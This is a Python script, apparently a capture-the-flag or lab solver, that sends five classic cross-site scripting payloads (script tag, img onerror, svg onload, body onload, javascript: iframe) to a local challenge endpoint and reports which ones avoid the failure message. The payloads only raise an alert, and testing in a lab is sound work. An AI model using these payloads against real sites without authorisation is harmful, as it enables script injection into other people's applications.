"""
XSS Payload Tester using urllib
Tests 5 XSS payloads with 'XSS' string on /page endpoint
"""
import urllib.parse
import urllib.request
import re

# Base URL
base_url = "http://127.0.0.1:33081/page"

# XSS payloads to test
payloads = [
    ("script_tag", "<script>alert('XSS')</script>"),
    ("img_onerror", "<img src=x onerror=alert('XSS')>"),
    ("svg_onload", "<svg onload=alert('XSS')>"),
    ("body_onload", "<body onload=alert('XSS')>"),
    ("iframe_javascript", '<iframe src="javascript:alert(\\'XSS\\')"></iframe>')
]

print("="*70)
print("[*] XSS Payload Testing - 5 Variants with 'XSS' string")
print("="*70)
print(f"[*] Target: {base_url}?name=[PAYLOAD]\n")

successful = []

for i, (name, payload) in enumerate(payloads, 1):
    print(f"\n{'-'*60}")
    print(f"[TEST {i}/5] {name}")
    print(f"{'-'*60}")
    
    # URL encode the payload (safe='' means encode everything)
    encoded = urllib.parse.quote(payload, safe='')
    print(f"[+] Raw: {payload}")
    print(f"[+] Encoded: {encoded}")
    
    # Create full URL
    full_url = f"{base_url}?name={encoded}"
    print(f"[+] URL: {full_url}")
    
    try:
        # Send request
        with urllib.request.urlopen(full_url, timeout=10) as response:
            html = response.read().decode('utf-8')
            status = response.status
            
        print(f"[+] Status: {status}")
        print(f"[+] Response size: {len(html)} bytes")
        
        # Extract solution-text
        match = re.search(r'<div class="solution-text"[^>]*>(.*?)</div>', html, re.DOTALL)
        if match:
            solution = match.group(1).strip()
            # Clean HTML tags for readability
            clean_solution = re.sub(r'<[^>]+>', '', solution)
            print(f"[+] solution-text: '{clean_solution[:200]}'")
            
            # Check for success/failure
            if "Failed! Try again!" in clean_solution:
                print(f"[-] Result: FAILED")
                
                # Check reflection
                if payload in html:
                    print(f"[INFO] Payload reflected (not executed)")
                elif encoded in html:
                    print(f"[INFO] Encoded payload in response")
                else:
                    print(f"[INFO] Payload not found (filtered)")
            else:
                print(f"[+] Result: SUCCESS! - No failure message")
                successful.append((name, payload, encoded, clean_solution[:300]))
        else:
            print(f"[-] Result: solution-text div not found")
        
        # Show first 1000 chars of response
        print(f"[+] Response preview:\n{html[:1000]}")
        
    except Exception as e:
        print(f"[-] ERROR: {e}")

# Final summary
print(f"\n\n{'='*70}")
print("[*] SUMMARY")
print(f"{'='*70}")
print(f"[*] Total tested: {len(payloads)}")
print(f"[*] Successful: {len(successful)}")

if successful:
    print("\n[+] WORKING PAYLOADS:")
    for i, s in enumerate(successful, 1):
        print(f"\n{i}. Name: {s[0]}")
        print(f"   Raw: {s[1]}")
        print(f"   Encoded: {s[2]}")
        print(f"   Result: {s[3][:100]}")
else:
    print("\n[-] No working payloads found")

print("\n[*] Test complete")
